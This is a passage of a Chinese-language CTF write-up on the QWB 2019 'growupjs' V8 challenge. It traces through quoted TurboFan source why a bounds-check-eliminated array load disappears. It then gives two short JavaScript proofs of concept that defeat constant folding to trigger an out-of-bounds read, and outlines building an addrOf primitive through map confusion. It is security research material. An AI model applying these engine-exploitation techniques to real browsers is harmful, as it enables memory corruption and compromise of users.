+<p>我们接着查看<code>graph_reducer.ReduceGraph()</code>，分别对每个节点调用上述添加的10个Reduce方法。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Reduction GraphReducer::Reduce(Node* <span class="keyword">const</span> node) &#123;</span><br><span class="line">  <span class="keyword">auto</span> skip = reducers_.end();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> i = reducers_.begin(); i != reducers_.end();) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i != skip) &#123;</span><br><span class="line">      Reduction reduction = (*i)-&gt;Reduce(node);</span><br><span class="line">      <span class="keyword">if</span> (!reduction.Changed()) &#123;</span><br><span class="line">        <span class="comment">// No change from this reducer.</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (reduction.replacement() == node) &#123;</span><br><span class="line">        <span class="comment">// &#123;replacement&#125; == &#123;node&#125; represents an in-place reduction. Rerun</span></span><br><span class="line">        <span class="comment">// all the other reducers for this node, as now there may be more</span></span><br><span class="line">        <span class="comment">// opportunities for reduction.</span></span><br><span class="line">        <span class="keyword">if</span> (FLAG_trace_turbo_reduction) &#123;</span><br><span class="line">          StdoutStream&#123;&#125; &lt;&lt; <span class="string">"- In-place update of "</span> &lt;&lt; *node &lt;&lt; <span class="string">" by reducer "</span></span><br><span class="line">                         &lt;&lt; (*i)-&gt;reducer_name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        skip = i;</span><br><span class="line">        i = reducers_.begin();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// &#123;node&#125; was replaced by another node.</span></span><br><span class="line">        <span class="keyword">if</span> (FLAG_trace_turbo_reduction) &#123;</span><br><span class="line">          StdoutStream&#123;&#125; &lt;&lt; <span class="string">"- Replacement of "</span> &lt;&lt; *node &lt;&lt; <span class="string">" with "</span></span><br><span class="line">                         &lt;&lt; *(reduction.replacement()) &lt;&lt; <span class="string">" by reducer "</span></span><br><span class="line">                         &lt;&lt; (*i)-&gt;reducer_name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> reduction;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (skip == reducers_.end()) &#123;</span><br><span class="line">    <span class="comment">// No change from any reducer.</span></span><br><span class="line">    <span class="keyword">return</span> Reducer::NoChange();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// At least one reducer did some in-place reduction.</span></span><br><span class="line">  <span class="keyword">return</span> Reducer::Changed(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>使用<code>trace-turbo-reduction</code>对节点的修改和替换细节进行分析。<br>我们重点观察上面消失的34和37两个节点。</p>
+<pre><code>- In-place update of 34: NumberLessThan(33, 16) by reducer TypeNarrowingReducer
+- Replacement of 34: NumberLessThan(33, 16) with 45: HeapConstant[0x0999a0780709 &lt;false&gt;] by reducer ConstantFoldingReducer
+- In-place update of 35: Branch[True|CriticalSafetyCheck](45, 12) by reducer BranchElimination
+- Replacement of 35: Branch[True|CriticalSafetyCheck](45, 12) with 60: Dead by reducer CommonOperatorReducer
+- Replacement of 37: LoadElement[tagged base, 16, Signed32, kRepTaggedSigned|kTypeInt32, FullWriteBarrier](49, 33, 33, 60) with 60: Dead by reducer DeadCodeElimination
+</code></pre><p>第二行可以看见34节点被替换成了<code>HeapConstant &lt;false&gt;</code>，使得35节点得<code>True</code>分支变为不可达，即37节点被<code>DeadCodeElimination</code>清除，所以不能够到达<code>LoadElement</code>节点。<br>那么为什么会被直接替换成<code>False</code>呢？<br>我们首先跟踪<code>TypeNarrowingReducer</code>，当<code>opcode</code>是<code>kNumberLessThan</code>时，如果<code>left_type.Min() &gt;= right_type.Max()</code>即左节点最小值大于等于右节点最大值，则类型被优化为<code>op_typer_.singleton_false()</code>。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Reduction TypeNarrowingReducer::Reduce(Node* node) &#123;</span><br><span class="line">  DisallowHeapAccess no_heap_access;</span><br><span class="line"></span><br><span class="line">  Type new_type = Type::Any();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kNumberLessThan: &#123;</span><br><span class="line">      <span class="comment">// TODO(turbofan) Reuse the logic from typer.cc (by integrating relational</span></span><br><span class="line">      <span class="comment">// comparisons with the operation typer).</span></span><br><span class="line">      Type left_type = NodeProperties::GetType(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">      Type right_type = NodeProperties::GetType(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">      <span class="keyword">if</span> (left_type.Is(Type::PlainNumber()) &amp;&amp;</span><br><span class="line">          right_type.Is(Type::PlainNumber())) &#123;</span><br><span class="line">        <span class="keyword">if</span> (left_type.Max() &lt; right_type.Min()) &#123;</span><br><span class="line">          new_type = op_typer_.singleton_true();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left_type.Min() &gt;= right_type.Max()) &#123;</span><br><span class="line">          new_type = op_typer_.singleton_false();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="comment">//[...]         </span></span><br><span class="line">  Type original_type = NodeProperties::GetType(node);</span><br><span class="line">  Type restricted = Type::Intersect(new_type, original_type, zone());</span><br><span class="line">  <span class="keyword">if</span> (!original_type.Is(restricted)) &#123;</span><br><span class="line">    NodeProperties::SetType(node, restricted);</span><br><span class="line">    <span class="keyword">return</span> Changed(node);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> NoChange();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到左节点为33，右节点为16。可以从<code>IR</code>中看到33节点的值范围为[4,4]，右节点是NumberConstant[4]，即常数值4。<br>在<code>ConstantFoldingReducer::Reduce</code>中34节点被替换为<code>HeapConstant</code>。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Reduction ConstantFoldingReducer::Reduce(Node* node) &#123;</span><br><span class="line">  DisallowHeapAccess no_heap_access;</span><br><span class="line">  <span class="comment">// Check if the output type is a singleton.  In that case we already know the</span></span><br><span class="line">  <span class="comment">// result value and can simply replace the node if it's eliminable.</span></span><br><span class="line">  <span class="keyword">if</span> (!NodeProperties::IsConstant(node) &amp;&amp; NodeProperties::IsTyped(node) &amp;&amp;</span><br><span class="line">      node-&gt;op()-&gt;HasProperty(Operator::kEliminatable)) &#123;</span><br><span class="line">    <span class="comment">// TODO(v8:5303): We must not eliminate FinishRegion here. This special</span></span><br><span class="line">    <span class="comment">// case can be removed once we have separate operators for value and</span></span><br><span class="line">    <span class="comment">// effect regions.</span></span><br><span class="line">    <span class="keyword">if</span> (node-&gt;opcode() == IrOpcode::kFinishRegion) <span class="keyword">return</span> NoChange();</span><br><span class="line">    <span class="comment">// We can only constant-fold nodes here, that are known to not cause any</span></span><br><span class="line">    <span class="comment">// side-effect, may it be a JavaScript observable side-effect or a possible</span></span><br><span class="line">    <span class="comment">// eager deoptimization exit (i.e. &#123;node&#125; has an operator that doesn't have</span></span><br><span class="line">    <span class="comment">// the Operator::kNoDeopt property).</span></span><br><span class="line">    Type upper = NodeProperties::GetType(node);</span><br><span class="line">    <span class="keyword">if</span> (!upper.IsNone()) &#123;</span><br><span class="line">      Node* replacement = <span class="literal">nullptr</span>;</span><br><span class="line">      <span class="keyword">if</span> (upper.IsHeapConstant()) &#123;</span><br><span class="line">        replacement = jsgraph()-&gt;Constant(upper.AsHeapConstant()-&gt;Ref());</span><br><span class="line"> <span class="comment">//[...]         </span></span><br><span class="line">      <span class="keyword">if</span> (replacement) &#123;</span><br><span class="line">        <span class="comment">// Make sure the node has a type.</span></span><br><span class="line">        <span class="keyword">if</span> (!NodeProperties::IsTyped(replacement)) &#123;</span><br><span class="line">          NodeProperties::SetType(replacement, upper);</span><br><span class="line">        &#125;</span><br><span class="line">        ReplaceWithValue(node, replacement);</span><br><span class="line">        <span class="keyword">return</span> Changed(replacement);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> NoChange();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>如果想要触发OOB，我们就要从33和16两个节点来考虑。<br>16节点的值是<code>element</code>的长度，所以我们只能考虑33节点。<br>33节点是<code>CheckBounds</code>，我们从Typer阶段看起。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function">Reduction <span class="title">Reduce</span><span class="params">(Node* node)</span> override </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node-&gt;op()-&gt;ValueOutputCount() == <span class="number">0</span>) <span class="keyword">return</span> NoChange();</span><br><span class="line">    <span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECLARE_CASE(x) \</span></span><br><span class="line">  <span class="keyword">case</span> IrOpcode::k#<span class="meta">#x:  \</span></span><br><span class="line">    <span class="keyword">return</span> UpdateType(node, TypeBinaryOp(node, x##Typer));</span><br><span class="line">      JS_SIMPLE_BINOP_LIST(DECLARE_CASE)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> DECLARE_CASE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECLARE_CASE(x) \</span></span><br><span class="line">  <span class="keyword">case</span> IrOpcode::k#<span class="meta">#x:  \</span></span><br><span class="line">    <span class="keyword">return</span> UpdateType(node, Type##x(node));</span><br><span class="line">      DECLARE_CASE(Start)</span><br><span class="line">      DECLARE_CASE(IfException)</span><br><span class="line">      <span class="comment">// VALUE_OP_LIST without JS_SIMPLE_BINOP_LIST:</span></span><br><span class="line">      COMMON_OP_LIST(DECLARE_CASE)</span><br><span class="line">      SIMPLIFIED_COMPARE_BINOP_LIST(DECLARE_CASE)</span><br><span class="line">      SIMPLIFIED_OTHER_OP_LIST(DECLARE_CASE)  <span class="comment">// [1]</span></span><br><span class="line">      JS_SIMPLE_UNOP_LIST(DECLARE_CASE)</span><br><span class="line">      JS_OBJECT_OP_LIST(DECLARE_CASE)</span><br><span class="line">      JS_CONTEXT_OP_LIST(DECLARE_CASE)</span><br><span class="line">      JS_OTHER_OP_LIST(DECLARE_CASE)</span><br></pre></td></tr></table></figure></p>
+<p>在<code>[1]</code>处有一个<code>SIMPLIFIED_OTHER_OP_LIST</code>宏定义，定义如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIMPLIFIED_OTHER_OP_LIST(V)     \</span></span><br><span class="line">  V(PlainPrimitiveToNumber)             \</span><br><span class="line">  ......</span><br><span class="line">  V(CheckBounds)                        \</span><br><span class="line">  V(CheckIf)                            \</span><br></pre></td></tr></table></figure></p>
+<p>变成如下表示：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IrOpcode::kCheckBounds:  \</span><br><span class="line">  <span class="keyword">return</span> UpdateType(node, TypeCheckBounds(node));</span><br></pre></td></tr></table></figure></p>
+<p><code>TypeCheckBounds(node)</code>如下表示：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Type Typer::Visitor::TypeCheckBounds(Node* node) &#123;</span><br><span class="line">  <span class="keyword">return</span> typer_-&gt;operation_typer_.CheckBounds(Operand(node, <span class="number">0</span>),</span><br><span class="line">                                              Operand(node, <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>其中又调用了<code>CheckBounds()</code>。其中<code>index</code>是实际的范围，<code>length</code>控制最大边界。最后返回<code>index</code>和<code>mask</code>的交集。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Type OperationTyper::CheckBounds(Type index, Type length) &#123;</span><br><span class="line">  DCHECK(length.Is(cache_.kPositiveSafeInteger));</span><br><span class="line">  <span class="keyword">if</span> (length.Is(cache_.kSingletonZero)) <span class="keyword">return</span> Type::None();</span><br><span class="line">  Type mask = Type::Range(<span class="number">0.0</span>, length.Max() - <span class="number">1</span>, zone());</span><br><span class="line">  <span class="keyword">if</span> (index.Maybe(Type::MinusZero())) &#123;</span><br><span class="line">    index = Type::Union(index, cache_.kSingletonZero, zone());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Type::Intersect(index, mask, zone());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Type Type::Intersect(Type type1, Type type2, Zone* zone) &#123;</span><br><span class="line">  <span class="comment">// Fast case: bit sets.</span></span><br><span class="line">  <span class="keyword">if</span> (type1.IsBitset() &amp;&amp; type2.IsBitset()) &#123;</span><br><span class="line">    <span class="keyword">return</span> NewBitset(type1.AsBitset() &amp; type2.AsBitset());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fast case: top or bottom types.</span></span><br><span class="line">  <span class="keyword">if</span> (type1.IsNone() || type2.IsAny()) <span class="keyword">return</span> type1;  <span class="comment">// Shortcut.</span></span><br><span class="line">  <span class="keyword">if</span> (type2.IsNone() || type1.IsAny()) <span class="keyword">return</span> type2;  <span class="comment">// Shortcut.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Semi-fast case.</span></span><br><span class="line">  <span class="keyword">if</span> (type1.Is(type2)) <span class="keyword">return</span> type1;</span><br><span class="line">  <span class="keyword">if</span> (type2.Is(type1)) <span class="keyword">return</span> type2;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Slow case: create union.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Semantic subtyping check - this is needed for consistency with the</span></span><br><span class="line">  <span class="comment">// semi-fast case above.</span></span><br><span class="line">  <span class="keyword">if</span> (type1.Is(type2)) &#123;</span><br><span class="line">    type2 = Any();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type2.Is(type1)) &#123;</span><br><span class="line">    type1 = Any();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">bitset</span> bits = type1.BitsetGlb() &amp; type2.BitsetGlb();</span><br><span class="line">  <span class="keyword">int</span> size1 = type1.IsUnion() ? type1.AsUnion()-&gt;Length() : <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> size2 = type2.IsUnion() ? type2.AsUnion()-&gt;Length() : <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> size;</span><br><span class="line">  <span class="keyword">if</span> (base::bits::SignedAddOverflow32(size1, size2, &amp;size)) <span class="keyword">return</span> Any();</span><br><span class="line">  <span class="keyword">if</span> (base::bits::SignedAddOverflow32(size, <span class="number">2</span>, &amp;size)) <span class="keyword">return</span> Any();</span><br><span class="line">  UnionType* result = UnionType::New(size, zone);</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Deal with bitsets.</span></span><br><span class="line">  result-&gt;Set(size++, NewBitset(bits));</span><br><span class="line"></span><br><span class="line">  RangeType::Limits lims = RangeType::Limits::Empty();</span><br><span class="line">  size = IntersectAux(type1, type2, result, size, &amp;lims, zone);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If the range is not empty, then insert it into the union and</span></span><br><span class="line">  <span class="comment">// remove the number bits from the bitset.</span></span><br><span class="line">  <span class="keyword">if</span> (!lims.IsEmpty()) &#123;</span><br><span class="line">    size = UpdateRange(Type::Range(lims, zone), result, size, zone);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove the number bits.</span></span><br><span class="line">    <span class="built_in">bitset</span> number_bits = BitsetType::NumberBits(bits);</span><br><span class="line">    bits &amp;= ~number_bits;</span><br><span class="line">    result-&gt;Set(<span class="number">0</span>, NewBitset(bits));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> NormalizeUnion(result, size, zone);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对于前面的POC相关的<code>CheckBounds</code>的<code>IR</code>如下图：<br><img src="/2020/05/17/QWB-CTF-2019-growupjs/003.png" alt="003"><br>最终取<code>[4,4]</code>和<code>[0,2147483646]</code>的交集，返回<code>[4,4]</code>。<br>此后在<code>loop peeling</code>中<code>NumberLessThan</code>的输入为<code>[4,4]</code>以及<code>常数[4]</code>，左边操作数的最小值<code>4</code>满足<code>&gt;= 常数[4]</code>导致<code>left_type.Min() &gt;= right_type.Max()</code>从而被优化为<code>HeapConstant &lt;false&gt;</code>，<code>True</code>分支不可达所以被剪掉了。</p>
+<h3 id="真正的POC"><a href="#真正的POC" class="headerlink" title="真正的POC"></a>真正的POC</h3><p>想要触发<code>OOB</code>，就不能让<code>LoadElement</code>消失，也就是要能让CheckBounds返回的范围最小值严格小于<code>Element</code>的<code>length</code>。<br>所以我们要对<code>CheckBounds</code>的第一个输入进行一定的修改。<br>在原本的测试POC中，我们直接赋值<code>index = 4</code>导致该节点<code>Range(4,4)</code>为一个数字常量。<br>在<a href="https://zhuanlan.zhihu.com/p/73081003" target="_blank" rel="noopener">长亭的分析文章</a>中，了解了两种绕过它(常数折叠)的方法。</p>
+<h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>第一种方法是给<code>index</code>添加一点算术运算。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"> <span class="keyword">let</span> idx = <span class="number">4</span>;</span><br><span class="line"> idx &amp;= <span class="number">0xfff</span>;</span><br><span class="line"> <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
+<p>这样会在原来<code>NumberConstant[4]</code>下面增加一个<code>SpeculativeNumberBitwiseAnd</code>节点，然后在进入C<code>heckBounds</code>节点，此时<code>CheckBounds</code>返回的是<code>[0,4]</code>，<code>LoadElement</code>在这样的情况下不会消失，可以成功触发OOB。<br><img src="/2020/05/17/QWB-CTF-2019-growupjs/004.png" alt="004"><br>以下是<code>SpeculativeNumberBitwiseAnd</code>节点在<code>Typer</code>的实现。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Type OperationTyper::NumberBitwiseAnd(Type lhs, Type rhs) &#123;</span><br><span class="line">  DCHECK(lhs.Is(Type::Number()));</span><br><span class="line">  DCHECK(rhs.Is(Type::Number()));</span><br><span class="line"></span><br><span class="line">  lhs = NumberToInt32(lhs);</span><br><span class="line">  rhs = NumberToInt32(rhs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lhs.IsNone() || rhs.IsNone()) <span class="keyword">return</span> Type::None();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">double</span> lmin = lhs.Min();</span><br><span class="line">  <span class="keyword">double</span> rmin = rhs.Min();</span><br><span class="line">  <span class="keyword">double</span> lmax = lhs.Max();</span><br><span class="line">  <span class="keyword">double</span> rmax = rhs.Max();</span><br><span class="line">  <span class="keyword">double</span> min = kMinInt;</span><br><span class="line">  <span class="comment">// And-ing any two values results in a value no larger than their maximum.</span></span><br><span class="line">  <span class="comment">// Even no larger than their minimum if both values are non-negative.</span></span><br><span class="line">  <span class="keyword">double</span> max =</span><br><span class="line">      lmin &gt;= <span class="number">0</span> &amp;&amp; rmin &gt;= <span class="number">0</span> ? <span class="built_in">std</span>::min(lmax, rmax) : <span class="built_in">std</span>::max(lmax, rmax);</span><br><span class="line">  <span class="comment">// And-ing with a non-negative value x causes the result to be between</span></span><br><span class="line">  <span class="comment">// zero and x.</span></span><br><span class="line">  <span class="keyword">if</span> (lmin &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    min = <span class="number">0</span>;</span><br><span class="line">    max = <span class="built_in">std</span>::min(max, lmax);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (rmin &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    min = <span class="number">0</span>;</span><br><span class="line">    max = <span class="built_in">std</span>::min(max, rmax);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Type::Range(min, max, zone());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>lmin</code>和<code>lmax</code>为4，<code>rmin</code>和<code>rmax</code>为255，可以看到返回的值范围是<code>[0,4]</code>。</p>
+<h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>第二种方法是逃逸分析，因为逃逸分析在LoadElimination和MachineOperatorReducer之间，所以我们可以把一个常数放在非逃逸对象中来避免常数折叠。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">let</span> o = &#123;<span class="attr">x</span>: <span class="number">4</span>&#125;;</span><br><span class="line"> <span class="keyword">return</span> arr[o.x];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>其<code>IR</code>如下所示：<br><img src="/2020/05/17/QWB-CTF-2019-growupjs/005.png" alt="005"><br><code>CheckBounds</code>节点的<code>Range</code>最小值为<code>0</code>，可以触发OOB。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="构造addrOf原语"><a href="#构造addrOf原语" class="headerlink" title="构造addrOf原语"></a>构造addrOf原语</h3><p>想法是当我们传入一个<code>obj</code>，构建<code>arr = [obj, obj, obj]</code>并通过越界修改该<code>arr</code>的<code>map</code>为<code>floatMapObj</code>。<br>我们首先通过<code>obj = [1.1, 2.2, 3.3]</code>获得一个<code>floatMap</code>Double值。通过偏移获得<code>objMap</code>，<code>objMap = floatMap + 0xa0</code>。<br>构造<code>fakeObj</code>，传入<code>fakeObj</code>的<code>addr</code>，修改<code>map</code>为上面算出来的<code>objMap</code>。<code>fakeObj</code>返回的是<code>object</code>类型。<br>获得<code>floatMapObj</code>，最后构造<code>addrOf</code>，传入<code>obj</code>，修改<code>map</code>为<code>floatMapObj</code>，返回的<code>float</code>值就是<code>obj</code>的地址。</p>
+<blockquote>
+<p>来自p4nda师傅的tips：这里有一个坑点，就是不能对一个PACKED_ELEMENTS类型的map位置直接写一个double，因为element一共有三种类型，并且是不可逆的改变，向PACKED_ELEMENTS类型的element写double会将double转换为一个HeapNumber，也是一个HeapObject，而非double值本身。</p>
+</blockquote>
